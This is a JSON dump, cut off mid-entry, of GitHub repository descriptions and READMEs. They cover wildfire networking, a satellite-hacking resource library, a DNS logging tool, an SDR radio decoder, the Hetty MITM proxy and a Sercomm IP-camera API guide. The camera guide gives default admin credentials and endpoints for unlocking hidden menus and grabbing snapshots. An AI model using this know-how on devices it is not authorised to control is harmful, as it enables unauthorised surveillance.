{"tags": [], "owner": "datalogistics", "description": "Code and scripts for applying DLT in a disconnected, challenged environment with a focus on wildfire incident response.", "name": "wildfire-dln", "topics_string": "", "language": "C", "readme": "\"# Wildland Fire Data Logistics Network (WildfireDLN): An Implementation of Resilient Networking\\nWildfireDLN will deliver rich and informative data with a robust system that supports file transfer and access across disconnected, heterogeneous networks to address the needs of wildland firefighting operations for increased network coverage and data portability.\\n\\nProject Leads\\n* __Nancy HF French (PI)__, Michigan Tech Research Institute\\n* __D Martin Swany__, Indiana University\\n* __Micah Beck__, University of Tennessee, Knoxville\\n\"", "topics": ["atak", "lora", "image-classification"], "writeup": "Wildland Fire Data Logistics Network (WildfireDLN): An Implementation of Resilient Networking WildfireDLN will deliver rich and informative data with a robust system that supports file transfer and access across disconnected, heterogeneous networks to address the needs of wildland firefighting operations for increased network coverage and data portability.\n", "ignoredescription": true, "id": 19, "full_name": "datalogistics/wildfire-dln", "url": "https://github.com/datalogistics/wildfire-dln", "topic_string": "atak lora image-classification"},
{"tags": [], "owner": "deptofdefense", "description": "Public library of space documents and tutorials", "name": "hack-a-sat-library", "topics_string": "", "language": "", "readme": "\"![Space Security Challeng 2020 Logo](./graphics/DDS-HASlibrary-logo.png \\\"Space Security Challeng 2020 Logo\\\")\\n\\n# HACK-A-SAT RESOURCE LIBRARY\\n\\nA collection of Resources for budding SAT hackers (Satellites, not the test\\u00af\\\\\\\\\\\\_(\\u30c4)\\\\_/\\u00af). *Note: This is an evolving resource, so please [contribute](./HASlibrary-contribute-instrxns.md) with a pull request*\\n\\n**Jump To**: [Web sites](#web-sites) | [Articles and Op-Eds](#articles-and-op-eds) | [Tools and Projects](#tools-and-projects) | [Videos](#videos) | [Books and White Papers](#books-and-white-papers) | [2020 Write-Ups](#hack-a-sat-2020-writeups) | [Programming Libraries](#programming-libraries) | [Miscellaneous](#miscellaneous) | [Contacts](#contacts)\\n\\n## BACKGROUND\\nThe democratization of space has opened up a new frontier for exploration and innovation. But with this opportunity, new cybersecurity vulnerabilities are also being created. One human can design, build and launch a satellite, adhering to very few standards and security protocols. So how can we achieve safe, reliable and trustworthy operations to truly realize the promise of space? ...BY HACKING A SATELLITE.\\n\\nThe United States Air Force, in conjunction with the Defense Digital Service, presents this year\\u2019s Space Security Challenge, Hack-A-Sat. This challenge asks hackers from around the world to focus their skills and creativity on solving cybersecurity challenges on space systems... THE QUESTION IS, HOW?\\n\\n## RESOURCES\\n\\n### Hack A Sat Workshops\\nWe are bringing a series of interactive workshops to DEF CON in complete Safemode via Twitch. Check out our vibrant, web-based virtual reality environment to access the workshops at [dds-virtual.com](https://dds-virtual.com/), otherwise, see the [github repo](https://github.com/deptofdefense/dds-at-DEFCON/blob/master/README.md) for the deets on game play for each of the work shops!\\n\\n### Hack A Sat Challenges \\n\\n- [Hack A Sat Qualifier Challenges](https://github.com/deptofdefense/HAS-Qualifier-Challenges) : Public version of the qualifier challenges from HAS 2020\\n\\n### Articles and Op-Eds\\n- Hackers could shut down satellites \\u2013 or turn them into weapons by William Akoto (https://theconversation.com/hackers-could-shut-down-satellites-or-turn-them-into-weapons-130932)\\n- Want to Hack a Satellite? It Might Be Easier Than You Think by Max Eddy with video presentation (https://forum.defcon.org/node/232085)\\n- It's Surprisingly Simple to Hack a Satellite by Lorenzo Franceschi-Bicchierai about Iridium hacking (https://forum.defcon.org/node/232079)\\n- Hacking Satellites Is Surprisingly Simple By Ryan Whitwam (https://www.extremetech.com/extreme/287284-hacking-satellites-is-probably-easier-than-you-think)\\n- Our satellites are prime targets for a cyberattack. And things could get worse. by Gergory Falco (https://www.washingtonpost.com/opinions/our-satellites-are-prime-targets-for-a-cyberattack-and-things-could-get-worse/2019/05/07/31c85438-7041-11e9-8be0-ca575670e91c_story.html)\\n\\n### Web Sites\\n- Satellite Orbits, Models, Methods, Applications, Oliver Montenbruck, Eberhard Gill (https://github.com/orbitalindex/awesome-space)\\n- Hackers Homepage on DSS signal hacking (https://hackershomepage.com/dss_hacking.htm)\\n- School Amateur Radio Club Network: \\\"a free on-line resource for anyone associated with or thinking about setting up a School Amateur Radio Club\\\"(https://sarcnet.org/)\\n- Satellite Projects (GOES Satellite Hunt and other), Lucas Teske (https://lucasteske.dev/satcom-projects/satellite-projects)\\n\\n### Tools and Projects\\n- **Mini Satellite-Antenna Rotator Mk1:** \\\"This project is a portable device used to automatically point a directional antenna towards an orbiting satellite.\\\"(https://forum.defcon.org/node/232474)\\n- **Webinar:** GNSS hacking, from satellite signals to hardware/software cybersecurity (https://www.youtube.com/watch?v=Au43CmiOO_g)\\n- **Presentation at RSA Conference 2019- Attack Vectors in Orbit:** The Need for IoT and Satellite Security by William J Malik, CISA: https://published-prd.lanyonevents.com/published/rsaus19/sessionsFiles/13692/MBS-W03-Attack-Vectors-in-Orbit-The-Need-for-IoT-and-Satellite-Security.pdf\\n- **Satellite Project:** Hackaday Satellite Projects (https://hackaday.io/list/4321-satellite-projects)\\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n### Videos\\n- Hacking Iridium Satellites With Iridium Toolkit by TechMinds (https://www.youtube.com/watch?v=usCJtuvXfPg)\\n- Iridium Satellite Hacking - HOPE XI 2016\\n(https://www.youtube.com/watch?v=cvKaC4pNvck&t=)\\n- SATCOM Terminals: Hacking by Air, Sea, and Land by Ruben Santamarta\\n(https://www.youtube.com/watch?v=YeKswEamOl4&t=)\\n- DEF CON 23 - Colby Moore - Spread Spectrum Satcom Hacking\\n(https://www.youtube.com/watch?v=2aBXpho5b7w&t=)\\n- 2012: Martin Rutishauser: Satellite Hacking: An Introduction\\n(https://www.youtube.com/watch?v=xIsG8GpB67A&t=)\\n- Reverse Engineering Satellite Based IP Content Distribution\\n(https://www.youtube.com/watch?v=U1WyBP4lKZk&t=)\\n- How to Reverse-Engineer a Satellite TV Smart Card\\n(https://www.youtube.com/watch?v=tnY7UVyaFiQ&t=)\\n- Reverse engineering Outernet (33c3)\\n(https://www.youtube.com/watch?v=TCoSRx7DpGY&t=)\\n- Reverse Engineering NOAA and ARGOS Satellite - Hot Topics - 9th September 2016\\n(https://www.youtube.com/watch?v=HjBMxoHTjCk&t=)\\n- Lucas Teske - Satellite Communications Reverse Engineering - H2HC 2016\\n(https://www.youtube.com/watch?v=SIxRyVKlpEo&t=)\\n- Spread Spectrum Satcom Hacking: Attacking The Globalstar Simplex Data Service\\n(https://www.youtube.com/watch?v=1VbmHmzofmc&t=)\\n- Hacking Iridium Satellites With Iridium Toolkit\\n(https://www.youtube.com/watch?v=usCJtuvXfPg&t=)\\n- Black Hat DC 2009 - Adam Laurie - Satellite Hacking for Fun and Profit\\n(https://www.youtube.com/watch?v=PyXZX63etog&t=)\\n- Stephan Gerling - Hacking Yachts Remotely via Satcom or Maritime Internet Router\\n(https://www.youtube.com/watch?v=mT7dXJ_ob8k&t=)\\n- Black Hat USA 2015 - Spread Spectrum Satcom Hacking Attacking The Globalstar Simplex Data Service\\n(https://www.youtube.com/watch?v=arPqhHQ-R4o&t=)\\n- SEC-T 2009 - Playing in a Satellite environment - Ram\\u00f3n Pinuaga\\n(https://www.youtube.com/watch?v=Z6FjVRYyCf4&t=)\\n- GPS As An Attack Vector\\n(https://www.youtube.com/watch?v=Duxr1yRKRoU&t=)\\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n### Books and White Papers\\n- **About:** Fundamentals of Astrodynamics and Applications, Third Edition by David A. Vallado\\n- **About:** Fundamentals of Spacecraft Attitude Determination and Control by F. Landis Markley, John L. Crassidis\\n- **About:** Satellite Communications Payload and System (https://ieeexplore.ieee.org/book/6305387)\\n- **How To:** Satellite Hacking: A Guide for the Perplexed: http://www.international-relations.com/CM2012/Satellite-Hacking.pdf\\n- **How To:** Satellite Network Hacking & Security Analysis by Adam Ali.Zare Hudaib (https://www.cscjournals.org/manuscript/Journals/IJCSS/Volume10/Issue1/IJCSS-1200.pdf)\\n- **How To:** Satellite Tool Kit Astronautics Primer by Jerry Jon Sellers Based on Understanding Space: An Introduction to Astronautics (http://lasp.colorado.edu/~lix/class/asen5050/stk_files/astroprimer.pdf)\\n- **How To:** NASA's Beginner's Guide to Rockets (https://www.grc.nasa.gov/www/k-12/rocket/bgmr.html)\\n- **How To:** CubeSat 101: Basic Concepts and Processes for First-Time CubeSat Developers (https://www.nasa.gov/sites/default/files/atoms/files/nasa_csli_cubesat_101_508.pdf)\\n- **How To:** Space Mission Engineering: The New SMAD (http://www.sme-smad.com/)\\n- **Types of Risks and Attacks:** MITIGATING CYBER SECURITY RISK IN SATELLITE GROUND SYSTEMS by Stephen F. Bichler, Maj, USAF (https://apps.dtic.mil/dtic/tr/fulltext/u2/1012754.pdf)\\n- **Types of Risks and Attacks:** Attack Vectors in Orbit: The Need for IoT and Satellite Security by William J Malik, CISA (https://published-prd.lanyonevents.com/published/rsaus19/sessionsFiles/13692/MBS-W03-Attack-Vectors-in-Orbit-The-Need-for-IoT-and-Satellite-Security.pdf)\\n- **Types of Risks and Attacks:** Cybersecurity Principles for Space Systems by Gregory Falco (https://2ea998fc-9f95-482a-87f8-dd57460966a8.filesusr.com/ugd/e741d3_daa22cd1e5234b8f9139fa9c7406be29.pdf)\\n- **Types of Risks and Attacks:** Electronic and Cyber Warfare in Outer Space by Rajeswari Pillai Rajagopalan (https://www.unidir.org/files/publications/pdfs/electronic-and-cyber-warfare-in-outer-space-en-784.pdf)\\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n### Hack-A-Sat 2020 Writeups\\n- Recap of the team Exodus Orbitals Alliance (192 out of 1278 teams)\\nhttps://blog.exodusorbitals.com/2020/05/26/hack-a-sat-2020-after-action-report/\\n- Where's the Sat? [HackaSat] [Writeup] by Philippe Delteil (https://medium.com/@pdelteil/wheres-the-sat-hack-a-sat-writeup-9a523634963b)\\n- Seeing Stars [HackASat] [Writeup] by Philippe Delteil (https://medium.com/@pdelteil/seeing-stars-hackasat-writeup-372e7859ca97)\\n- Track The Sat - Ground Segment by Keramas (https://keramas.github.io/2020/05/24/HackASat-CTF.html)\\n- 56k Flex Magic - Communication Systems by Keramas (https://keramas.github.io/2020/05/25/HackASat-Part2.html)\\n- 56k Flex Magic - Communication Systems by Tan (https://medium.com/@solomontan_68263/56k-flex-magic-hack-a-sat-2020-f63df73b7dfd)\\n- I Like to Watch \\u2013 Hack-A-Sat CTF Challenge Solution [Writeup] by Dawid Golunski (https://pentest.co.uk/insights/i-like-to-watch-hack-a-sat-challenge/)\\n- Hack-a-Sat CTF Writeup: My 0x20 (aka \\u201dMyspace\\u201d) [Writeup] by OH HAI THERE\\n(https://ohaithe.re/post/619784043448418304/hack-a-sat-ctf-writeup-my-0x20-aka-myspace)\\n- Hack-A-Sat 2020: Sun? On my Sat? [Writeup] by OH starfleetcadet75\\n(https://starfleetcadet75.github.io/writeups/2020/06/05/sun-on-my-sat.html)\\n- Vaporsec CTF team from DC 858/619 summarizes the event and lessons learned (https://www.facebook.com/DC858/videos/281579856584929/) \\n- LaunchLink - Hack-A-Sat Quals 2020 [Writeup] by erfur (https://erfur.github.io/LaunchLink_Hackasat/)\\n- Leaky Crypto - Hack-A-Sat Writeup: [Writeup] by ADDVulcan (https://github.com/ADDVulcan/ADDVulcan/tree/master/Payload%20Modules/Leaky%20Crypto) \\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n### Programming Libraries\\n- CCSDSPy: Provides an IO Interface for reading CCSDS data in Python. The CCSDS format is used for many NASA and ESA missions for low-level telemetry (https://ccsdspy.readthedocs.io/en/latest/)\\n- Satpy: Python library for reading and manipulating meteorological remote sensing data and writing it to various image and data file formats (https://github.com/pytroll/satpy)\\n- SGP4: Python version of the SGP4 satellite position library (https://github.com/brandon-rhodes/python-sgp4)\\n- Poliastro: Collection of Python functions useful in Astrodynamics and Orbital Mechanics, focusing on interplanetary applications. It provides a simple and intuitive API and handles physical quantities with units (https://docs.poliastro.space/en/stable/)\\n- Skyfield: Computes positions for the stars, planets, and satellites in orbit around the Earth (https://rhodesmill.org/skyfield/)\\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n### Miscellaneous\\n- SPACEX - ISS Docking Simulator: This simulator will familiarize you with the controls of the actual interface used by NASA Astronauts to manually pilot the SpaceX Dragon 2 vehicle to the International Space (https://iss-sim.spacex.com)\\n- Satellite, Junk, and Flare Tracking (https://www.satflare.com/home.asp)\\n- Feed Hunting and Satellite Mapping (http://www.feedhunter.com/)\\n\\n## CONTACTS\\n### Space and Satellite Security POCs\\n- [Adam Ali Zare Hudaib](mailto:adamhudaib@gmail.com): Author of Satellite Network Hacking & Security Analysis\\n- [William Akoto](mailto:william@willakoto.com): Author of Hackers could shut down satellites \\u2014 or turn them into weapons\\n- [LT COL Stephen Bichler](mailto:stephen.bichler@us.af.mil): Author of MITIGATING CYBER SECURITY RISK IN SATELLITE GROUND SYSTEMS\\n- [Gregory Falco](mailto:falco@stanford.edu): Author of Cybersecurity Principles for Space Systems\\n\\n### Defense Digital Service Library Custodians\\n- Clair Koroma (clair@dds.mil)\\n- Daniel Allen (dan@dds.mil)\\n- Nick Ashworth (nick.ashworth@dds.mil)\\n\\n## *Also check out our [Aviation Hacking Resource Library](https://github.com/deptofdefense/hack-aviation-library/blob/master/README.md)*\\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n![Space Security Challeng 2020 Footer Logo](./graphics/DDShackasatlogobottom.png \\\"Space Security Challeng 2020 Logo\\\")\\n\"", "topics": ["offensive", "dod", "space"], "writeup": "Public library of space documents, tutorials, and resources for budding satellite hackers", "ignoredescription": false, "id": 20, "full_name": "deptofdefense/hack-a-sat-library", "url": "https://github.com/deptofdefense/hack-a-sat-library", "topic_string": "offensive dod space"},
{"tags": [], "owner": "droberson", "description": "DNS logging, detection, ...", "name": "greylost", "topics_string": "", "language": "Python", "readme": "\"# Greylost\\n\\nThis sniffs DNS traffic and logs queries. It implements a time-based\\nfilter to narrow the scope of DNS logs for analysts to examine; if\\ntraffic to Google is typical for your environment, you won't be\\ninnundated with these query logs, but WILL get logs for\\nmalwaredomain123.xyz if that is an atypical query.\\n\\nThis can be installed locally, on a resolver/forwarder, or on a\\nmachine plugged into a switchport that is mirroring ports.\\n\\n## Installation\\n```\\npip3 install -r requirements.txt\\n```\\n\\n## Usage:\\n```\\nusage: greylost.py [-h] [--alllog ALLLOG] [--notdnslog NOTDNSLOG]\\n [--greylistmisslog GREYLISTMISSLOG] [-b BPF] [-d]\\n [--learningtime LEARNINGTIME] [--logging] [--ignore IGNORE]\\n [-i INTERFACE] [-o] [-p PRECISION] [-r PIDFILE]\\n [-s FILTERSIZE] [-t FILTERTIME] [-v] [-w DUMPFILE]\\n\\ngreylost by @dmfroberson\\n\\noptional arguments:\\n -h, --help show this help message and exit\\n --alllog ALLLOG /path/to/all-log -- log of all DNS queries\\n --notdnslog NOTDNSLOG\\n /path/to/not-dns-log -- log of non-DNS protocol\\n traffic\\n --greylistmisslog GREYLISTMISSLOG\\n /path/to/greylist-miss-log -- log of greylist misses\\n -b BPF, --bpf BPF BPF filter to apply to the sniffer\\n -d, --daemonize Daemonize\\n --learningtime LEARNINGTIME\\n Time to baseline queries before alerting on greylist\\n misses\\n --logging Toggle logging\\n --ignore IGNORE File containing list of domains to ignore when\\n greylisting\\n -i INTERFACE, --interface INTERFACE\\n Interface to sniff\\n -o, --stdout Toggle stdout output\\n -p PRECISION, --precision PRECISION\\n Precision of bloom filter. Ex: 0.001\\n -r PIDFILE, --pidfile PIDFILE\\n Path to PID file\\n -s FILTERSIZE, --filtersize FILTERSIZE\\n Size of bloom filter\\n -t FILTERTIME, --filtertime FILTERTIME\\n Filter time\\n -v, --verbose increase verbosity\\n -w DUMPFILE, --dumpfile DUMPFILE\\n Write captured packets to a dumpfile\\n```\\n\\nExample:\\n```\\n./greylost.py -i eth0 --stdout --logging\\n```\\n\\n## Splunk\\nThe JSON logs provided by greylost can be indexed by Splunk.\\n\\n### Quickstart\\nAdd indexes:\\n```\\ngreylost-all\\ngreylost-misses\\ngreylost-malware\\n```\\n\\nAssuming you have Universal Forwarder installed and configured:\\n```\\nsplunk add monitor /path/to/greylost-all.log -index greylost-all\\nsplunk add monitor /path/to/greylost-misses.log -index greylost-misses\\nsplunk add monitor /path/to/greylost-malware.log -index greylost-malware\\nsplunk add monitor /path/to/greylost-notdns.log -index greylost-notdns\\n```\\n\\n### Searching\\nNo dashboards or application exists (yet), but here are some queries\\nI've found useful:\\n\\nSearch for resolutions of _malware.com_:\\n```\\nindex=greylost-all \\\"questions{}.qname\\\"=\\\"malware.com.\\\"\\n```\\n\\nCounts of queries per host:\\n```\\nindex=greylost-misses | chart count by saddr\\n```\\n\\nCounts of query types:\\n```\\nindex=greylost-misses |chart count by \\\"questions{}.qtype\\\"\\n```\\n\\nHosts sending non-DNS traffic:\\n```\\nindex=greylost-notdns | chart count by saddr\\n```\\n\\nHosts querying lots of TXT records:\\n```\\nindex=greylost-misses \\\"questions{}.qtype\\\"=TXT | chart count by saddr\\n```\"", "topics": ["sniffer", "dns", "logging"], "writeup": "sniffs DNS traffic and logs queries. It implements a time-based filter to narrow the scope of DNS logs for analysts to examine; if traffic to Google is typical for your environment, you won't be innundated with these query logs, but WILL get logs for malwaredomain123.xyz if that is an atypical query. This can be installed locally, on a resolver/forwarder, or on a machine plugged into a switchport that is mirroring ports.\n", "ignoredescription": false, "id": 21, "full_name": "droberson/greylost", "url": "https://github.com/droberson/greylost", "topic_string": "sniffer dns logging"},
{"tags": [], "owner": "DSheirer", "description": "A cross-platform java application for decoding, monitoring, recording and streaming trunked mobile and related radio protocols using Software Defined Radios (SDR).  Website:", "name": "sdrtrunk", "topics_string": "", "language": "Java", "readme": "\"# sdrtrunk\\nA cross-platform java application for decoding, monitoring, recording and streaming trunked mobile and related radio protocols using Software Defined Radios (SDR).\\n\\n* [Getting Started](https://github.com/DSheirer/sdrtrunk/wiki/GettingStarted_V0.3.0)\\n* [User's Manual Version 0.3.0 and 0.4.0](https://github.com/DSheirer/sdrtrunk/wiki/UserManual_V0.3.0)\\n* [Playlist Editor User Manual Version 0.5.0](https://github.com/DSheirer/sdrtrunk/wiki/Playlist-Editor)\\n* [Download](https://github.com/DSheirer/sdrtrunk/releases)\\n* [Support Group](https://groups.google.com/forum/#!forum/sdrtrunk)\\n* [Discord Support Channel](https://discord.gg/HJQaKYE)\\n\\n![sdrtrunk Application Overview - Version 0.3.0](https://github.com/DSheirer/sdrtrunk/wiki/v0.3/images/ApplicationOverview_V0.3.0.png)\\n**Figure 1:** sdrtrunk **Version 0.3.0** Application Screenshot\\n\\n# End User Instructions:\\n\\nIf you simply want to download and run the program, please follow these instructions.\\n\\n## Download the latest sdrtrunk release for your operating system\\n \\nAll release versions of sdrtrunk are available from the [releases](https://github.com/DSheirer/sdrtrunk/releases) tab.\\n\\n* **(alpha)** These versions are under development feature previews and likely to contain bugs and unexpected behavior.\\n* **(beta)** These versions are currently being tested for bugs and functionality prior to final release.\\n* **(final)** These versions have been tested and are the current release version.\\n\\n## Unzip the release\\n\\nUse 7-zip or any zip utility to unzip the release file\\n\\n## Start the application\\n\\nOnce unzipped, open a command prompt to where you unzipped the release. Change to the **/bin** directory and use the launch script to start the application:\\n* **Windows** sdr-trunk.bat\\n* **Linux/OSX** ./sdr-trunk\\n\\n## Optional - P25 Audio\\nIf you're using sdrtrunk with a P25 trunked radio system, the [JMBE](https://github.com/DSheirer/sdrtrunk/wiki/JMBE) wiki page contains instructions for downloading the JMBE audio library source code and compiling the JMBE library. Once you have compiled the library, launch the sdrtrunk application. From the menu bar, choose **View >> Preferences**. In the **JMBE Audio Codec** section, update the path to where your compiled JMBE library is located. Any channels that are started after you set the path will be able to produce P25 audio.\\n\\n## Minimum System Requirements\\n* **Operating System:** Windows (~~32 or~~ 64-bit), Linux (~~32 or~~ 64-bit) or Mac/Linux (64-bit, 10.14 or higher)\\n* **CPU:** 4-core\\n* **RAM:** 8GB or more (preferred). Depending on usage, 4GB may be sufficient.\\n\\n# Developer Instructions:\\n\\nIf you're interested in modifying and/or compiling the source code, please follow these instructions to use gradle to compile the code. \\n\\n## Build the project\\nsdrtrunk uses the gradle build system. This requires OpenJDK 11 or higher installed on your local compuber. Use the gradle wrapper to build the source code:\\n\\n### Linux\\n```\\n./gradlew clean build\\n```\\n### Windows\\n```\\ngradlew.bat clean build\\n```\\n\\nThe **/build/distributions** folder will contain the zip file of the compiled program. Unzip it and launch the program from the scripts in the **/bin** directory.\\n\\n## Development\\nAll dependencies/versions are controlled from build.gradle.\\nTo change the new release version tag of artifact - change property:\\n```\\nversion = '0.5.0'\\n```\\n\"", "topics": ["p25", "sdr"], "writeup": "", "ignoredescription": false, "id": 22, "full_name": "DSheirer/sdrtrunk", "url": "https://github.com/DSheirer/sdrtrunk", "topic_string": "p25 sdr"},
{"tags": [], "owner": "dstotijn", "description": "Hetty is an HTTP toolkit for security research. It aims to become an open source alternative to commercial software like Burp Suite Pro, with powerful features tailored to the needs of the infosec and bug bounty community.", "name": "hetty", "topics_string": "", "language": "Go", "readme": "\"<img src=\\\"https://i.imgur.com/AT71SBq.png\\\" width=\\\"346\\\" />\\n\\n> Hetty is an HTTP toolkit for security research. It aims to become an open source\\n> alternative to commercial software like Burp Suite Pro, with powerful features\\n> tailored to the needs of the infosec and bug bounty community.\\n\\n<img src=\\\"https://i.imgur.com/ZZ6o83X.png\\\">\\n\\n## Features/to do\\n\\n- [x] HTTP man-in-the-middle (MITM) proxy and GraphQL server.\\n- [x] Web interface (Next.js) with proxy log viewer.\\n- [ ] Add scope support to the proxy.\\n- [ ] Full text search (with regex) in proxy log viewer.\\n- [ ] Project management.\\n- [ ] Sender module for sending manual HTTP requests, either from scratch or based\\n off requests from the proxy log.\\n- [ ] Attacker module for automated sending of HTTP requests. Leverage the concurrency\\n features of Go and its `net/http` package to make it blazingly fast.\\n\\n## Installation\\n\\nHetty is packaged on GitHub as a single binary, with the web interface resources\\nembedded.\\n\\n\\ud83d\\udc49 You can find downloads for Linux, macOS and Windows on the [releases page](https://github.com/dstotijn/hetty/releases).\\n\\n### Alternatives:\\n\\n**Build from source**\\n\\n```\\n$ GO111MODULE=auto go get -u -v github.com/dstotijn/hetty/cmd/hetty\\n```\\n\\nThen export the Next.js frontend app:\\n\\n```\\n$ cd admin\\n$ yarn install\\n$ yarn export\\n```\\n\\nThis will ensure a folder `./admin/dist` exists.\\nThen, you can bundle the frontend app using `rice`.\\nThe easiest way to do this is via a supplied `Makefile` command in the root of\\nthe project:\\n\\n```\\nmake build\\n```\\n\\n**Docker**\\n\\nAlternatively, you can run Hetty via Docker. See: [`dstotijn/hetty`](https://hub.docker.com/r/dstotijn/hetty)\\non Docker Hub.\\n\\n```\\n$ docker run \\\\\\n-v $HOME/.hetty/hetty_key.pem:/root/.hetty/hetty_key.pem \\\\\\n-v $HOME/.hetty/hetty_cert.pem:/root/.hetty/hetty_cert.pem \\\\\\n-v $HOME/.hetty/hetty.bolt:/root/.hetty/hetty.bolt \\\\\\n-p 127.0.0.1:8080:8080 \\\\\\ndstotijn/hetty\\n```\\n\\n## Usage\\n\\nHetty is packaged as a single binary, with the web interface resources embedded.\\nWhen the program is run, it listens by default on `:8080` and is accessible via\\nhttp://localhost:8080. Depending on incoming HTTP requests, it either acts as a\\nMITM proxy, or it serves the GraphQL API and web interface (Next.js).\\n\\n```\\n$ hetty -h\\nUsage of ./hetty:\\n -addr string\\n TCP address to listen on, in the form \\\"host:port\\\" (default \\\":8080\\\")\\n -adminPath string\\n File path to admin build\\n -cert string\\n CA certificate filepath. Creates a new CA certificate is file doesn't exist (default \\\"~/.hetty/hetty_cert.pem\\\")\\n -db string\\n Database file path (default \\\"~/.hetty/hetty.bolt\\\")\\n -key string\\n CA private key filepath. Creates a new CA private key if file doesn't exist (default \\\"~/.hetty/hetty_key.pem\\\")\\n```\\n\\n\\u26a0\\ufe0f _Todo: Write instructions for installing CA certificate in local CA store, and_\\n_configuring Hetty to be used as a proxy server._\\n\\n## Vision and roadmap\\n\\nThe project has just gotten underway, and as such I haven\\u2019t had time yet to do a\\nwrite-up on its mission and roadmap. A short summary/braindump:\\n\\n- Fast core/engine, built with Go, with a minimal memory footprint.\\n- GraphQL server to interact with the backend.\\n- Easy to use web interface, built with Next.js and Material UI.\\n- Extensibility is top of mind. All modules are written as Go packages, to\\n be used by the main `hetty` program, but also usable as libraries for other software.\\n Aside from the GraphQL server, it should (eventually) be possible to also use\\n it as a CLI tool.\\n- Pluggable architecture for the MITM proxy and future modules, making it\\n possible for hook into the core engine.\\n- I\\u2019ve chosen [Cayley](https://cayley.io/) as the graph database (backed by\\n BoltDB storage on disk) for now (not sure if it will work in the long run).\\n The benefit is that Cayley (also written in Go)\\n is embedded as a library. Because of this, the complete application is self contained\\n in a single running binary.\\n- Talk to the community, and focus on the features that the majority.\\n Less features means less code to maintain.\\n\\n## Status\\n\\nThe project is currently under active development. Please star/follow and check\\nback soon. \\ud83e\\udd17\\n\\n## Acknowledgements\\n\\nThanks to the [Hacker101 community on Discord](https://www.hacker101.com/discord)\\nfor all the encouragement to actually start building this thing!\\n\\n## License\\n\\n[MIT](LICENSE)\\n\\n---\\n\\n\\u00a9 2020 David Stotijn \\u2014 [Twitter](https://twitter.com/dstotijn), [Email](mailto:dstotijn@gmail.com)\\n\"", "topics": ["bugbounty", "mitm", "offensive", "proxy", "security", "http"], "writeup": "", "ignoredescription": false, "id": 23, "full_name": "dstotijn/hetty", "url": "https://github.com/dstotijn/hetty", "topic_string": "bugbounty mitm offensive proxy security http"},
{"tags": [], "owner": "edent", "description": "A comprehensive guide to the controlling Sercomm IP Cameras via their inbuit API", "name": "Sercomm-API", "topics_string": "", "language": "", "readme": "\"# Sercomm Camera API\\n\\nThis is designed to be a fairly comprehensive set of API documentation for [SerComm IP Cameras](http://www.sercomm.com/contpage.aspx?langid=1&type=prod2&L1id=2&L2id=3&L3id=9).\\n\\nThese API calls have been tested on the following cameras:\\n\\n* RC8221 - a basic internal camera.\\n* RC8221D - a modified version of the above camera.\\n* OC821D - an external camera with weatherproof features.\\n* RC8230 - a pan/tilt camera.\\n* iCamera1 - a POE external camera.\\n* RC8025b-ADT - A version of RC8221 with similar functionality for ADT Pulse\\n\\nSercomm supplies cameras to a number of partners - each with a custom firmware. It is possible your camera does not have access to all these API calls.\\n\\n[![Buy me a coffee](https://www.ko-fi.com/img/donate_sm.png)](https://ko-fi.com/edent)\\n\\n\\n## Accessing The Cameras\\nYour camera may have been supplied with a username and password. If you do not know what these credentials are, you can reset the camera to its defaults.\\n\\n### Process\\n* Unplug the power from the camera.\\n* Plug in a network cable and connect it to your network.\\n* Hold a pin/paperclip in the \\\"reset\\\" hole on the back of the device.\\n* With the pin still held in, connect the power to the camera.\\n* Keep the pin in for 10 seconds, then release it.\\n* (You may need to power cycle the camera again without holding in the reset button if it doesn't connect to the network).\\n* Visit the IP address of the camera.\\n* Click on \\\"Administration\\\"\\n* The default username is `administrator`. There is **no** password.\\n* You will now be able to create a new admin user with a strong password.\\n* **Note:** you will need to log in quickly, or ensure that the camera cannot connect to the Internet. Some cameras will \\\"phone home\\\" and reconfigure themselves with the vendor's username & password.\\n\\n## API Calls\\nThe API is RESTful - although it isn't very communicative. \\n\\nAll API calls are `GET` except where noted.\\n\\nResponses are in plain text except where noted.\\n\\n### Enable the UI\\nSome cameras don't show a menu by default.\\n\\n* This command is used to [activate the administration menu](https://github.com/edent/Sercomm-API/issues/1) on vendor modified firmwares such as Comcast Xfinity, Cox Homelife and ADT Pulse.\\n * `/adm/enable_ui.cgi`\\n * Response `OK`\\n\\n\\n### Increase Resolution\\nMany cameras have a \\\"hidden\\\" 720p resolution. This can be activated for video and still images.\\n\\n* Set Video to 720p\\n * `/adm/set_group.cgi?group=H264&resolution=4`\\n * Response `OK`\\n \\n* Set JPG to 720p\\n * `/adm/set_group.cgi?group=JPEG&resolution=4`\\n * Response `OK`\\n\\n\\n### Get Still Image\\n* To get a JPEG of what the camera is currently seeing.\\n * `/img/snapshot.cgi`\\n * Response is a JPEG encoded image.\\n* Parameters\\n * Set the resolution of the image with\\n * `size=1` 1280*720\\n * `size=2` 320*240\\n * `size=3` 640*480\\n * Set the quality of the image. The higher the JPEG quality, the larger the file.\\n * `quality=1` JPEG quality 85\\n * `quality=2` JPEG quality 70\\n * `quality=3` JPEG quality 55\\n * `quality=4` JPEG quality 40\\n * `quality=5` JPEG quality 25\\n\\n### Pan / Tilt Movement\\nFor cameras which have moveable lenses, it is possible to control the direction the camera is facing.\\n\\n* The pan/tilt can be controlled in to different ways.\\n * `/pt/ptctrl.cgi?mv=$Direction,$Distance`\\n\\nWhere `$Direction` can be `U`p, `D`own, `L`eft, `R`ight.\\n\\nAnd `$Distance` can be any positive integer.\\n\\nThe maximum `U` and `D` value is `64`.\\n\\nThe maximum `L` and `R` value is `??`.\\n\\nFor example:\\n\\n* Left\\n * `/pt/ptctrl.cgi?mv=L,10`\\n* Right\\n * `/pt/ptctrl.cgi?mv=R,10`\\n* Up\\n * `/pt/ptctrl.cgi?mv=U,10`\\n* Down\\n * `/pt/ptctrl.cgi?mv=D,10`\\n\\nDiagonal moves can also be made:\\n\\n* Up Left\\n * `/pt/ptctrl.cgi?mv=UL,10`\\n* Up Right\\n * `/pt/ptctrl.cgi?mv=UR,10`\\n* Down Left\\n * `/pt/ptctrl.cgi?mv=DL,10`\\n* Down Right\\n * `/pt/ptctrl.cgi?mv=DR,10`\\n \\nThere are preset locations which can be accessed\\n\\n* Motion Detection (Unsure TODO!)\\n * `/pt/ptctrl.cgi?preset=move,100`\\n* Camera Patrol (Unsure TODO!)\\n * 